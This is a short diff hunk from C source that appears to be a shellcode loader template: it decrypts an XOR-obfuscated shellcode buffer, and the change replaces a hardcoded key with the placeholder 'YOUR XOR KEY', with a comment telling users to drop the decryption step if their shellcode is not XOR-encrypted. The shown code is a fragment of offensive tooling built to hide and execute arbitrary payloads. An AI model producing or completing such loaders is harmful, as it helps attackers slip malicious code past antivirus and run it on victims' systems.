@@ -27,7 +27,7 @@ char NDLCRY[] = "\x14\x35\x37\x28\x3b";
 int main(int argc, char* argv[]) {
 
     //decrypt shellcode
-    char key[] = "Zasdwes2";
+    char key[] = "YOUR XOR KEY";
     int ciphertext_length = sizeof(shellcode);
     //delete following line if you do not XOR encrypt your shellcode
     xor_decrypt(shellcode, ciphertext_length, key);
